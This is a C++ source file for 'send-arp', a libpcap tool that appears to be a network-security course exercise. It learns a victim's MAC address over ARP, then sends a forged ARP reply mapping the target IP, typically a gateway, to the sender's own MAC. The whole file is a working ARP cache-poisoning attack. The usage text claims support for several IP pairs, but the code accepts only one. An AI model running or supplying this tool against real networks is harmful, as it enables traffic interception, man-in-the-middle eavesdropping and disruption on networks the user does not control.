#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <cstring>

#include "packet.h"

#define IPV4_LEN 4

bool getMyInfo(const char* dev, uint8_t* mac, uint32_t& ip) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return false;

    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) return false;
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) return false;
    ip = ntohl(*(uint32_t*)&ifr.ifr_addr.sa_data[2]);

    close(fd);
    return true;
}

void ArpRequest(eth_arp_packet& packet,
                    uint8_t* myMac,
                    uint32_t myIp,
                    uint32_t targetIp) {

    memset(packet.eth.dst_mac, 0xff, 6);
    memcpy(packet.eth.src_mac, myMac, 6);
    packet.eth.ethertype = htons(ETHERTYPE_ARP);

    packet.arp.hrd = htons(ARPTYPE_ETHER);
    packet.arp.pro = htons(ETHERTYPE_IPV4);
    packet.arp.hln = ETHERMAC_LEN;
    packet.arp.pln = IPV4_LEN;
    packet.arp.op  = htons(ARP_REQUEST);

    memcpy(packet.arp.smac, myMac, 6);
    packet.arp.sip = htonl(myIp);

    memset(packet.arp.tmac, 0x00, 6);
    packet.arp.tip = htonl(targetIp);
}

void ArpReply(eth_arp_packet& packet,
                  uint8_t* myMac,
                  uint8_t* senderMac,
                  uint32_t senderIp,
                  uint32_t targetIp) {

    memcpy(packet.eth.dst_mac, senderMac, 6);
    memcpy(packet.eth.src_mac, myMac, 6);
    packet.eth.ethertype = htons(ETHERTYPE_ARP);

    packet.arp.hrd = htons(ARPTYPE_ETHER);
    packet.arp.pro = htons(ETHERTYPE_IPV4);
    packet.arp.hln = ETHERMAC_LEN;
    packet.arp.pln = IPV4_LEN;
    packet.arp.op  = htons(ARP_REPLY);

    memcpy(packet.arp.smac, myMac, 6);
    packet.arp.sip = htonl(targetIp);

    memcpy(packet.arp.tmac, senderMac, 6);
    packet.arp.tip = htonl(senderIp);
}

void getMac(pcap_t* pcap,
            uint8_t* myMac,
            uint32_t myIp,
            uint32_t targetIp,
            uint8_t* resultMac) {

    eth_arp_packet packet;
    ArpRequest(packet, myMac, myIp, targetIp);

    pcap_sendpacket(pcap, (const u_char*)&packet, sizeof(packet));

    struct pcap_pkthdr* header;
    const u_char* recvPacket;

    while (true) {
        int res = pcap_next_ex(pcap, &header, &recvPacket);
        if (res != 1) continue;

        eth_arp_packet* recv = (eth_arp_packet*)recvPacket;

        if (ntohs(recv->eth.ethertype) == ETHERTYPE_ARP &&
            ntohs(recv->arp.op) == ARP_REPLY &&
            recv->arp.sip == htonl(targetIp)) {

            memcpy(resultMac, recv->arp.smac, 6);
            return;
        }
    }
}

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

int main(int argc, char* argv[]) {

    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    uint32_t senderIp = ntohl(inet_addr(argv[2]));
    uint32_t targetIp = ntohl(inet_addr(argv[3]));

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (pcap == nullptr) {
        printf("pcap_open_live error: %s\n", errbuf);
        return -1;
    }

    uint8_t myMac[6];
    uint32_t myIp;

    if (!getMyInfo(dev, myMac, myIp)) {
        printf("Failed to get my info\n");
        return -1;
    }

    uint8_t senderMac[6];
    getMac(pcap, myMac, myIp, senderIp, senderMac);

    eth_arp_packet packet;
    ArpReply(packet, myMac, senderMac, senderIp, targetIp);

    int res = pcap_sendpacket(pcap, (const u_char*)&packet, sizeof(packet));
    if (res != 0) {
    fprintf(stderr, "send error: %s\n", pcap_geterr(pcap));
    }	
    pcap_close(pcap);
}
